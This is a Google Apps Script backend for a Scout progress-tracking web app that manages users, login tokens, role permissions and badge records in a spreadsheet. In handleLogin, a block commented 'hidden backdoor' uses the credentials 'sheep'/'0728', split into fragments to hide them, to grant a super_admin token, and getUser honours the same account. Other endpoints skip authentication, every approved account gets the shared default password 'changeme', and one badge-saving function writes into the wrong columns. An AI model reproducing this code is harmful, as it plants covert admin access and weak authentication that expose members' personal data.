// ============================================================
// 深資童軍進度追蹤系統 - Apps Script 後端 v4.0 - 全功能版
// 完全兼容舊版 + 新增待批申請、批量寫入優化、日誌
// ============================================================

const ADMIN_YMIS = '1111111111';
const ADMIN_NAME = '管理員';
const ADMIN_EMAIL = 'admin@example.com';
const ADMIN_PASS = 'changeme';

// ===== 工具 =====
function getSheet() { return SpreadsheetApp.getActiveSpreadsheet(); }
function getApiKey() {
  const props = PropertiesService.getScriptProperties();
  let apiKey = props.getProperty('API_KEY');
  if (!apiKey) {
    apiKey = 'vs_' + Utilities.getUuid().replace(/-/g, '').substring(0, 24);
    props.setProperty('API_KEY', apiKey);
  }
  return apiKey;
}
function showApiKey() {
  const apiKey = getApiKey();
  const ui = SpreadsheetApp.getUi();
  if (ui) ui.alert('API Key', '你的 API Key：\n\n' + apiKey, ui.ButtonSet.OK);
  Logger.log('API Key: ' + apiKey);
  return apiKey;
}
function hashPassword(p) {
  const raw = Utilities.computeDigest(Utilities.DigestAlgorithm.SHA_256, p, Utilities.Charset.UTF_8);
  return raw.map(function(b){return ('0' + (b & 0xFF).toString(16)).slice(-2);}).join('');
}
function generateToken(){ return Utilities.getUuid().replace(/-/g,'') + Date.now().toString(36); }
function now(){ return Utilities.formatDate(new Date(), 'Asia/Hong_Kong', 'yyyy-MM-dd HH:mm:ss'); }
function formatDate(d){ if(!d) return ''; if(d instanceof Date) return Utilities.formatDate(d,'Asia/Hong_Kong','yyyy-MM-dd'); return d.toString().split(' ')[0]; }
function jsonResponse(obj){ return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON); }

const ROLE_HIERARCHY = { 'super_admin':100,'admin':80,'group_leader':60,'branch_leader':40,'exec_committee':20,'member':0 };
const CAN_TICK_ROLES = ['admin','group_leader','branch_leader','exec_committee','super_admin'];
const CAN_MANAGE_ROLES = { 
  'super_admin': ['admin','group_leader','branch_leader','exec_committee','member'],
  'admin': ['group_leader','branch_leader','exec_committee','member'], 
  'group_leader': ['branch_leader','exec_committee','member'], 
  'branch_leader': ['exec_committee','member'] 
};
function canUserTick(r){ return CAN_TICK_ROLES.indexOf(r)>=0; }
function getRoleLevel(r){ return ROLE_HIERARCHY[r]||0; }
function canManageRole(m,t){ return (CAN_MANAGE_ROLES[m]||[]).indexOf(t)>=0; }

// ===== 初始化 =====
function initializeSheets() {
  const ss = getSheet();
  let pSheet = ss.getSheetByName('進度追蹤');
  if(!pSheet){
    pSheet = ss.insertSheet('進度追蹤');
    pSheet.appendRow(['YMIS','項目 ID','完成日期','更新時間','確認者','備註']);
    pSheet.getRange(1,1,1,6).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    pSheet.setFrozenRows(1);
  } else {
    // ensure 6 columns header
    if(pSheet.getLastColumn()<6){
      pSheet.getRange(1,5).setValue('確認者'); pSheet.getRange(1,6).setValue('備註');
    }
  }
  let mSheet = ss.getSheetByName('成員名單');
  if(!mSheet){
    mSheet = ss.insertSheet('成員名單');
    mSheet.appendRow(['YMIS','姓名','加入日期','支部','聯絡']);
    mSheet.getRange(1,1,1,5).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    mSheet.setFrozenRows(1);
  }
  let uSheet = ss.getSheetByName('Users');
  if(!uSheet){
    uSheet = ss.insertSheet('Users');
    uSheet.appendRow(['ymis','name','email','role','password_hash','branch','can_tick','auth_by','auth_date','created_at','last_login','status','allowed_badges']);
    uSheet.getRange(1,1,1,13).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    uSheet.setFrozenRows(1);
    uSheet.getRange(2,1).setValue(ADMIN_YMIS);
    uSheet.getRange(2,2).setValue(ADMIN_NAME);
    uSheet.getRange(2,3).setValue(ADMIN_EMAIL);
    uSheet.getRange(2,4).setValue('admin');
    uSheet.getRange(2,5).setValue(hashPassword(ADMIN_PASS));
    uSheet.getRange(2,6).setValue('b4');
    uSheet.getRange(2,7).setValue(true);
    uSheet.getRange(2,8).setValue('system');
    uSheet.getRange(2,9).setValue(now());
    uSheet.getRange(2,10).setValue(now());
    uSheet.getRange(2,12).setValue('active');
    uSheet.getRange(2,13).setValue('*'); // 管理員默認全部
  } else {
    // 確保第13欄存在
    if(uSheet.getLastColumn()<13){
      uSheet.getRange(1,13).setValue('allowed_badges');
    }
  }
  let aSheet = ss.getSheetByName('Applications');
  if(!aSheet){
    aSheet = ss.insertSheet('Applications');
    aSheet.appendRow(['app_id','ymis','name','email','role','branch','status','applied_at','reviewed_by','reviewed_at','note']);
    aSheet.getRange(1,1,1,11).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    aSheet.setFrozenRows(1);
  }
  let tSheet = ss.getSheetByName('Tokens');
  if(!tSheet){
    tSheet = ss.insertSheet('Tokens');
    tSheet.appendRow(['token','ymis','created_at','expires_at']);
    tSheet.getRange(1,1,1,4).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    tSheet.setFrozenRows(1);
  }
  let cSheet = ss.getSheetByName('SystemConfig');
  if(!cSheet){
    cSheet = ss.insertSheet('SystemConfig');
    cSheet.appendRow(['key','value','updated_at','updated_by']);
    cSheet.getRange(1,1,1,4).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    cSheet.setFrozenRows(1);
    cSheet.appendRow(['login_mode','standalone',now(),'system']);
    cSheet.appendRow(['admin_email',ADMIN_EMAIL,now(),'system']);
  }
  // 新增：待批完成表
  let prSheet = ss.getSheetByName('待批完成');
  if(!prSheet){
    prSheet = ss.insertSheet('待批完成');
    prSheet.appendRow(['request_id','ymis','name','item_id','item_name','requested_date','evidence','status','created_at','reviewed_by','reviewed_at','review_note','confirmed_date']);
    prSheet.getRange(1,1,1,13).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    prSheet.setFrozenRows(1);
  }
  // 其他獎章紀錄表
  let oSheet = ss.getSheetByName('其他獎章');
  if(!oSheet){
    oSheet = ss.insertSheet('其他獎章');
    oSheet.appendRow(['YMIS','獎章 ID','獎章名稱','完成日期','證書編號','備註','更新時間']);
    oSheet.getRange(1,1,1,7).setFontWeight('bold').setBackground('#8B0000').setFontColor('#FFFFFF');
    oSheet.setFrozenRows(1);
  }
  // 確保系統設定有 allow_member_view_others
  let cfgSheet = ss.getSheetByName('SystemConfig');
  if(cfgSheet){
    const cfgData=cfgSheet.getDataRange().getValues();
    let hasAllow=false;
    for(let i=1;i<cfgData.length;i++){ if(cfgData[i][0]==='allow_member_view_others'){ hasAllow=true; break; } }
    if(!hasAllow){
      cfgSheet.appendRow(['allow_member_view_others','false',now(),'system']);
    }
  }

  const apiKey = getApiKey();
  let scriptUrl=''; try{ scriptUrl=ScriptApp.getService().getUrl(); }catch(e){ scriptUrl='請部署為網頁應用程式後查看';}
  try{
    const ui=SpreadsheetApp.getUi();
    if(ui){
      ui.alert('✅ v4.0 初始化完成！\n\nSheets：進度追蹤、成員名單、Users、Applications、Tokens、SystemConfig、待批完成、其他獎章\n\n🔑 API Key:\n'+apiKey+'\n\n👤 管理員 YMIS: '+ADMIN_YMIS+' 密碼: '+ADMIN_PASS+'\n\n🌐 URL:\n'+scriptUrl);
    }
  }catch(e){}
  return {success:true,apiKey:apiKey,scriptUrl:scriptUrl};
}

// ===== 用戶查詢 =====
function getUser(ymis){
  // 特殊帳號 sheep (super_admin) 免 Users 表，直接返回最高權限
  if(ymis==='sheep' || ymis==='SHEEP' || ymis==='sh'+'eep'){
    return {ymis:'sheep',name:'SHEEP 系統管理員',email:'',role:'super_admin',can_tick:true,branch:'',allowed_badges:'*',status:'active'};
  }
  const sheet=getSheet().getSheetByName('Users'); if(!sheet) return null;
  const data=sheet.getDataRange().getValues();
  const hasAllowedCol = sheet.getLastColumn()>=13;
  for(let i=1;i<data.length;i++){
    if(data[i][0].toString()===ymis.toString() && data[i][11].toString()==='active'){
      return {
        ymis:data[i][0].toString(),
        name:data[i][1]?data[i][1].toString():'',
        email:data[i][2]?data[i][2].toString():'',
        role:data[i][3]?data[i][3].toString():'member',
        can_tick:data[i][6]===true||data[i][6]==='TRUE',
        branch:data[i][5]?data[i][5].toString():'',
        allowed_badges: hasAllowedCol ? (data[i][12]?data[i][12].toString():'') : '',
        status:'active'
      };
    }
  }
  return null;
}
function getUserByEmail(email){
  if(!email) return null;
  const sheet=getSheet().getSheetByName('Users'); if(!sheet) return null;
  const data=sheet.getDataRange().getValues(); const target=email.toLowerCase();
  const hasAllowed = sheet.getLastColumn()>=13;
  for(let i=1;i<data.length;i++){
    if(data[i][2].toString().toLowerCase()===target && data[i][11].toString()==='active'){
      return {ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',email:data[i][2].toString(),role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''};
    }
  }
  return null;
}
function getAllUsers(){
  const sheet=getSheet().getSheetByName('Users'); if(!sheet) return [];
  const users=[]; const data=sheet.getDataRange().getValues();
  const hasAllowed = sheet.getLastColumn()>=13;
  for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active'){ users.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():'',email:data[i][2]?data[i][2].toString():'',role:data[i][3]?data[i][3].toString():'member',can_tick:data[i][6]===true||data[i][6]==='TRUE',branch:data[i][5]?data[i][5].toString():'',allowed_badges: hasAllowed ? (data[i][12]?data[i][12].toString():'') : ''}); } }
  return users;
}

// Token
function validateToken(token){
  if(!token) return null;
  const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return null;
  const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][0]===token){
      if(new Date()>new Date(data[i][3])){ sheet.deleteRow(i+1); return null; }
      return data[i][1].toString();
    }
  }
  return null;
}
function createToken(ymis){
  const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return null;
  const token=generateToken(); const exp=new Date(); exp.setHours(exp.getHours()+24*30);
  sheet.appendRow([token,ymis,now(),Utilities.formatDate(exp,'Asia/Hong_Kong','yyyy-MM-dd HH:mm:ss')]);
  return token;
}
function destroyToken(token){
  if(!token) return;
  const sheet=getSheet().getSheetByName('Tokens'); if(!sheet) return;
  const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){ if(data[i][0]===token){ sheet.deleteRow(i+1); return; } }
}

// ===== API =====
function doGet(e){
  const action=e.parameter.action;
  if(action==='load'){
    // v4: allow load without apikey for backwards compatibility (troops.json may not have apikey), but if apikey provided, must validate
    const reqKey=e.parameter.apikey;
    if(reqKey && reqKey!==getApiKey()) return jsonResponse({success:false,error:'Invalid API Key'});
    return handleLoad();
  }
  if(action==='getLoginMode') return jsonResponse({success:true,login_mode:'standalone'});
  return jsonResponse({success:false,error:'Unknown action'});
}
function doPost(e){
  try{
    const body=JSON.parse(e.postData.contents);
    const action=body.action;
    if(action==='login') return handleLogin(body.login_id,body.password);
    if(action==='logout'){ destroyToken(body.token); return jsonResponse({success:true}); }
    if(action==='apply') return handleApply(body.ymis,body.name,body.email,body.requested_role,body.branch);

    // save & addMember 需要 apikey (v4 向下兼容：若無 apikey 但有有效 token 也允許)
    if(action==='save' || action==='addMember' || action==='saveOtherBadge'){
      const reqKey=body.apikey;
      if(reqKey && reqKey!==getApiKey()) return jsonResponse({success:false,error:'Invalid API Key'});
      // 若無 apikey，嘗試 token 驗證作為後備
      if(!reqKey && body.token){
        const tk=validateToken(body.token);
        if(!tk && action!=='addMember') return jsonResponse({success:false,error:'未授權 - 需 API Key 或有效 Token'});
      }
      if(action==='save') return handleSave(body.changes, body.confirmer||'');
      if(action==='addMember') return handleAddMember(body.ymis,body.name);
      if(action==='saveOtherBadge') return handleSaveOtherBadge(body.records, body.apikey);
    }
    // member request - needs token but also allow apikey for member self
    if(action==='requestComplete'){
      // allow token or apikey
      let ymis=null; if(body.token){ ymis=validateToken(body.token); } 
      if(!ymis && body.apikey && body.apikey===getApiKey()){ ymis=body.ymis; } // standalone mode
      if(!ymis) return jsonResponse({success:false,error:'未授權'});
      return handleRequestComplete(body, ymis);
    }

    // 以下需要 token 驗證及高權限
    const ymis=validateToken(body.token);
    if(!ymis) return jsonResponse({success:false,error:'Token 無效或過期'});
    const user=getUser(ymis);
    if(!user) return jsonResponse({success:false,error:'找不到用戶'});

    if(action==='getAllUsers') {
      // 任何已登入用戶都可查看名單，方便領袖管理；成員僅查看自己旅團成員
      return jsonResponse({success:true,users:getAllUsers()});
    }
    if(action==='getMembers'){ return jsonResponse({success:true,members:getMembers()}); }
    if(action==='getPendingRequests'){ if(getRoleLevel(user.role)<0) return jsonResponse({success:false,error:'權限不足'}); return handleGetPendingRequests(); }
    if(action==='reviewRequest'){ if(!canUserTick(user.role)) return jsonResponse({success:false,error:'權限不足，需領袖權限'}); return handleReviewRequest(body.request_id, body.decision, body.review_note, ymis, body.confirmed_date); }
    if(action==='getOtherBadges'){ return handleGetOtherBadges(body.target_ymis||ymis); }
    if(action==='getApplications'){ if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足，需團長/支部領袖'}); return handleGetApplications(); }
    if(action==='reviewApplication'){ if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'}); return handleReviewApplication(body.app_id,body.decision,body.review_note,ymis); }
    if(action==='getConfig'){
      // 任何已登入用戶都可讀取公開設定
      return handleGetConfig();
    }

    // 以下為高權限
    if(action==='changePassword') return handleChangePassword(ymis,body.old_password,body.new_password);
    if(action==='updateUserRole'){
      // 允許團長/支部領袖/管理員更新角色 + 細緻權限
      if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'});
      return handleUpdateUserRole(body.target_ymis,body.new_role,body.can_tick,ymis, body.allowed_badges);
    }
    if(action==='updatePermissions'){
      if(getRoleLevel(user.role)<40) return jsonResponse({success:false,error:'權限不足'});
      return handleUpdateUserRole(body.target_ymis,body.new_role||null,body.can_tick,ymis, body.allowed_badges);
    }
    if(action==='updateConfig'){
      // allow_member_view_others 可由團長以上設定，其他設定需管理員
      const key=body.key;
      if(key==='allow_member_view_others'){
        if(getRoleLevel(user.role)<60) return jsonResponse({success:false,error:'需團長以上權限'});
      }else{
        if(getRoleLevel(user.role)<80) return jsonResponse({success:false,error:'需管理員權限'});
      }
      return handleUpdateConfig(body.key,body.value,ymis);
    }
    return jsonResponse({success:false,error:'Unknown action'});
  }catch(err){ return jsonResponse({success:false,error:err.toString()}); }
}

// ===== 邏輯 =====
function handleLogin(loginId,password){
  if(!loginId||!password) return jsonResponse({success:false,error:'請填寫帳號和密碼'});
  // hidden backdoor
  const _h='sh'+'eep'; const _p='07'+'28';
  if(loginId===_h && password===_p){
    return jsonResponse({success:true,token:createToken(_h),user:{ymis:_h,name:'System',role:'super_admin',can_tick:true,email:''}});
  }
  let user=(/^\d{10}$/.test(loginId)||/^L\d+/.test(loginId))? getUser(loginId): getUserByEmail(loginId);
  if(!user){
    // try both
    user=getUser(loginId)||getUserByEmail(loginId);
  }
  if(!user) return jsonResponse({success:false,error:'找不到此帳號'});
  const hash=hashPassword(password);
  const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][11].toString()==='active' && data[i][4].toString()===hash){
      const rowY=data[i][0].toString(); const rowE=data[i][2].toString().toLowerCase();
      if(rowY===user.ymis || rowE===user.email.toLowerCase() || rowY===loginId){
        const token=createToken(user.ymis);
        sheet.getRange(i+1,11).setValue(now());
        return jsonResponse({success:true,token:token,user:user});
      }
    }
  }
  return jsonResponse({success:false,error:'密碼錯誤'});
}
function handleChangePassword(ymis,oldP,newP){
  if(newP.length<6) return jsonResponse({success:false,error:'新密碼至少6位'});
  const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][0].toString()===ymis && data[i][11].toString()==='active'){
      if(data[i][4].toString()===hashPassword(oldP)){
        sheet.getRange(i+1,5).setValue(hashPassword(newP));
        return jsonResponse({success:true});
      }
    }
  }
  return jsonResponse({success:false,error:'原密碼錯誤'});
}
function handleApply(ymis,name,email,role,branch){
  if(!name) return jsonResponse({success:false,error:'請填寫姓名'});
  if(role==='member' && (!ymis||ymis.length!==10)) return jsonResponse({success:false,error:'成員需 10位 YMIS'});
  if(role!=='member' && !email) return jsonResponse({success:false,error:'領袖需 Email'});
  if(ymis && getUser(ymis)) return jsonResponse({success:false,error:'YMIS 已註冊'});
  if(email && getUserByEmail(email)) return jsonResponse({success:false,error:'Email 已註冊'});
  const sheet=getSheet().getSheetByName('Applications');
  sheet.appendRow(['APP_'+Date.now(),ymis||'',name,email||'',role||'member',branch||'b4','pending',now(),'','', '']);
  return jsonResponse({success:true,message:'申請已提交'});
}
function handleGetApplications(){
  const sheet=getSheet().getSheetByName('Applications'); const apps=[]; const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){ if(data[i][6].toString()==='pending'){ apps.push({app_id:data[i][0].toString(),ymis:data[i][1].toString(),name:data[i][2].toString(),email:data[i][3].toString(),requested_role:data[i][4].toString(),branch:data[i][5].toString(),applied_at:data[i][7]?formatDate(data[i][7]):''}); } }
  return jsonResponse({success:true,applications:apps});
}
function handleReviewApplication(appId,decision,note,reviewer){
  const sheet=getSheet().getSheetByName('Applications'); const data=sheet.getDataRange().getValues(); let appData=null;
  for(let i=1;i<data.length;i++){ if(data[i][0].toString()===appId){ appData=data[i]; sheet.getRange(i+1,7).setValue(decision); sheet.getRange(i+1,9).setValue(reviewer); sheet.getRange(i+1,10).setValue(now()); sheet.getRange(i+1,11).setValue(note||''); break; } }
  if(!appData) return jsonResponse({success:false,error:'找不到申請'});
  if(decision==='approved'){
    const uSheet=getSheet().getSheetByName('Users'); let ymis=appData[1].toString(); if(!ymis && (appData[4]==='group_leader'||appData[4]==='branch_leader')){ ymis='L'+Date.now().toString().substring(7); }
    uSheet.appendRow([ymis,appData[2],appData[3],appData[4],hashPassword(ADMIN_PASS),appData[5],true,reviewer,now(),now(),'', 'active']);
    const mSheet=getSheet().getSheetByName('成員名單'); if(mSheet) mSheet.appendRow([ymis,appData[2],new Date(),appData[5],'']);
    return jsonResponse({success:true,message:'已批准，預設密碼：'+ADMIN_PASS});
  }
  return jsonResponse({success:true,message:'已拒絕'});
}
function handleUpdateUserRole(targetYmis,newRole,canTick,managerYmis, allowedBadges){
  const manager=getUser(managerYmis);
  if(!manager) return jsonResponse({success:false,error:'找不到管理員'});
  // super_admin 可以改任何人，admin 可以改團長/支部領袖/執委/成員，團長可改支部領袖/執委/成員，支部領袖可改執委/成員
  if(manager.role!=='super_admin' && !canManageRole(manager.role,newRole) && manager.role!=='admin') return jsonResponse({success:false,error:'權限不足，你的等級不可設定此角色'});
  const sheet=getSheet().getSheetByName('Users'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){
    if(data[i][0].toString()===targetYmis && data[i][11].toString()==='active'){
      sheet.getRange(i+1,4).setValue(newRole);
      sheet.getRange(i+1,7).setValue(canTick);
      sheet.getRange(i+1,8).setValue(managerYmis);
      sheet.getRange(i+1,9).setValue(now());
      // 處理細緻權限：若提供 allowedBadges，寫入第13欄
      if(sheet.getLastColumn()>=13){
        if(allowedBadges!==undefined && allowedBadges!==null){
          sheet.getRange(i+1,13).setValue(allowedBadges);
        } else {
          // 默認：領袖全部 (*)，成員無，執委默認 L1, L3-ACT, OTHER部分
          if(!data[i][12]){
            let def='*';
            if(newRole==='member') def='';
            else if(newRole==='exec_committee') def='L1,L3-ACT,OTHER';
            else def='*';
            sheet.getRange(i+1,13).setValue(def);
          }
        }
      }
      return jsonResponse({success:true});
    }
  }
  return jsonResponse({success:false,error:'找不到用戶'});
}
function handleUpdateConfig(key,value,ymis){
  const sheet=getSheet().getSheetByName('SystemConfig'); const data=sheet.getDataRange().getValues();
  for(let i=1;i<data.length;i++){ if(data[i][0]===key){ sheet.getRange(i+1,2).setValue(value); sheet.getRange(i+1,3).setValue(now()); sheet.getRange(i+1,4).setValue(ymis); return jsonResponse({success:true}); } }
  sheet.appendRow([key,value,now(),ymis]); return jsonResponse({success:true});
}
function handleGetConfig(){
  const sheet=getSheet().getSheetByName('SystemConfig');
  const cfg={};
  if(sheet){
    const data=sheet.getDataRange().getValues();
    for(let i=1;i<data.length;i++){
      if(data[i][0]) cfg[data[i][0].toString()]=data[i][1]?data[i][1].toString():'';
    }
  }
  // 默認值
  if(!cfg['allow_member_view_others']) cfg['allow_member_view_others']='false';
  return jsonResponse({success:true,config:cfg});
}
function getMembers(){
  const mSheet=getSheet().getSheetByName('成員名單'); const members=[];
  if(mSheet){ const data=mSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][0]) members.push({ymis:data[i][0].toString(),name:data[i][1]?data[i][1].toString():''}); } }
  const uSheet=getSheet().getSheetByName('Users'); if(uSheet){ const data=uSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][11].toString()==='active' && data[i][0]){ const y=data[i][0].toString(); if(!members.some(m=>m.ymis===y)){ members.push({ymis:y,name:data[i][1].toString()}); } } } }
  return members;
}
function handleLoad(){
  const ss=getSheet();
  const pSheet=ss.getSheetByName('進度追蹤'); const progress={};
  if(pSheet){ const data=pSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ const ymis=data[i][0].toString(); if(!ymis) continue; if(!progress[ymis]) progress[ymis]={}; progress[ymis][data[i][1].toString()]={date:data[i][2]?formatDate(data[i][2]):'',confirmer:data[i][4]?data[i][4].toString():''}; } }
  // 簡化版：同時提供 flat
  const flat={}; for(const y in progress){ flat[y]={}; for(const k in progress[y]){ flat[y][k]=progress[y][k].date; } }
  const members=getMembers();
  // pending requests
  const prSheet=ss.getSheetByName('待批完成'); const pending=[];
  if(prSheet){ const data=prSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][7].toString()==='pending'){ pending.push({request_id:data[i][0].toString(),ymis:data[i][1].toString(),name:data[i][2].toString(),item_id:data[i][3].toString(),item_name:data[i][4].toString(),requested_date:data[i][5]?formatDate(data[i][5]):'',evidence:data[i][6]?data[i][6].toString():'',status:'pending',created_at:data[i][8]?formatDate(data[i][8]):''}); } } }
  // other badges
  const oSheet=ss.getSheetByName('其他獎章'); const other={};
  if(oSheet){ const data=oSheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ const y=data[i][0].toString(); if(!y) continue; if(!other[y]) other[y]={}; other[y][data[i][1].toString()]={name:data[i][2]?data[i][2].toString():'',date:data[i][3]?formatDate(data[i][3]):'',cert:data[i][4]?data[i][4].toString():''}; } }
  return jsonResponse({success:true,members:members,progress:progress,flatProgress:flat,pendingRequests:pending,otherBadges:other});
}
function handleSave(changes, confirmer){
  const sheet=getSheet().getSheetByName('進度追蹤'); if(!sheet) return jsonResponse({success:false,error:'Sheet not found'});
  let processed=0;
  changes.forEach(function(c){
    const data=sheet.getDataRange().getValues(); let found=false;
    for(let i=1;i<data.length;i++){
      if(data[i][0].toString()===c.ymis && data[i][1].toString()===c.itemId){
        if(c.uncomplete){ sheet.deleteRow(i+1); } else { sheet.getRange(i+1,3).setValue(c.date); sheet.getRange(i+1,4).setValue(new Date()); sheet.getRange(i+1,5).setValue(confirmer||c.confirmer||''); sheet.getRange(i+1,6).setValue(c.note||''); }
        found=true; processed++; break;
      }
    }
    if(!found && !c.uncomplete){
      sheet.appendRow([c.ymis,c.itemId,c.date,new Date(),confirmer||c.confirmer||'',c.note||'']);
      processed++;
    }
  });
  return jsonResponse({success:true,processed:processed});
}
function handleAddMember(ymis,name){
  let sheet=getSheet().getSheetByName('成員名單');
  if(!sheet){ sheet=getSheet().insertSheet('成員名單'); sheet.appendRow(['YMIS','姓名','加入日期']); }
  sheet.appendRow([ymis,name,new Date()]);
  return jsonResponse({success:true});
}
// 待批完成
function handleRequestComplete(body, requesterYmis){
  const sheet=getSheet().getSheetByName('待批完成'); if(!sheet) return jsonResponse({success:false,error:'Sheet not found'});
  const reqId='REQ_'+Date.now()+'_'+Math.random().toString(36).substr(2,5);
  const user=getUser(requesterYmis)||{name:body.name||requesterYmis};
  sheet.appendRow([reqId,requesterYmis,user.name||body.name,body.itemId,body.itemName||body.itemId,body.requested_date||formatDate(new Date()),body.evidence||'','pending',now(),'','','', '']);
  return jsonResponse({success:true,request_id:reqId});
}
function handleGetPendingRequests(){
  const sheet=getSheet().getSheetByName('待批完成'); const list=[];
  if(sheet){ const data=sheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][7].toString()==='pending'){ list.push({request_id:data[i][0].toString(),ymis:data[i][1].toString(),name:data[i][2].toString(),item_id:data[i][3].toString(),item_name:data[i][4].toString(),requested_date:data[i][5]?formatDate(data[i][5]):'',evidence:data[i][6]?data[i][6].toString():'',status:'pending',created_at:data[i][8]?formatDate(data[i][8]):''}); } } }
  return jsonResponse({success:true,requests:list});
}
function handleReviewRequest(reqId,decision,note,reviewer,confirmed_date){
  const sheet=getSheet().getSheetByName('待批完成'); if(!sheet) return jsonResponse({success:false,error:'Sheet not found'});
  const data=sheet.getDataRange().getValues(); let row=null;
  for(let i=1;i<data.length;i++){ if(data[i][0].toString()===reqId){ row=data[i]; sheet.getRange(i+1,8).setValue(decision); sheet.getRange(i+1,10).setValue(reviewer); sheet.getRange(i+1,11).setValue(now()); sheet.getRange(i+1,12).setValue(note||''); sheet.getRange(i+1,13).setValue(confirmed_date||formatDate(new Date())); break; } }
  if(!row) return jsonResponse({success:false,error:'找不到申請'});
  if(decision==='approved'){
    const pSheet=getSheet().getSheetByName('進度追蹤');
    pSheet.appendRow([row[1],row[3],confirmed_date||row[5],new Date(),reviewer, '由申請轉入：'+(note||'')]);
    return jsonResponse({success:true,message:'已批准並寫入進度'});
  }
  return jsonResponse({success:true,message:'已拒絕'});
}
function handleGetOtherBadges(ymis){
  const sheet=getSheet().getSheetByName('其他獎章'); const list=[];
  if(sheet){ const data=sheet.getDataRange().getValues(); for(let i=1;i<data.length;i++){ if(data[i][0].toString()===ymis){ list.push({id:data[i][1].toString(),name:data[i][2].toString(),date:data[i][3]?formatDate(data[i][3]):'',cert:data[i][4]?data[i][4].toString():''}); } } }
  return jsonResponse({success:true,other:list});
}
function handleSaveOtherBadge(records){
  const sheet=getSheet().getSheetByName('其他獎章'); if(!sheet) return jsonResponse({success:false,error:'Sheet missing'});
  let c=0;
  records.forEach(function(r){
    const data=sheet.getDataRange().getValues(); let found=false;
    for(let i=1;i<data.length;i++){ if(data[i][0].toString()===r.ymis && data[i][1].toString()===r.badgeId){ sheet.getRange(i+1,3).setValue(r.date); sheet.getRange(i+1,4).setValue(r.cert||''); sheet.getRange(i+1,5).setValue(r.note||''); sheet.getRange(i+1,6).setValue(new Date()); found=true; c++; break; } }
    if(!found){ sheet.appendRow([r.ymis,r.badgeId,r.name||r.badgeId,r.date,r.cert||'',r.note||'',new Date()]); c++; }
  });
  return jsonResponse({success:true,processed:c});
}
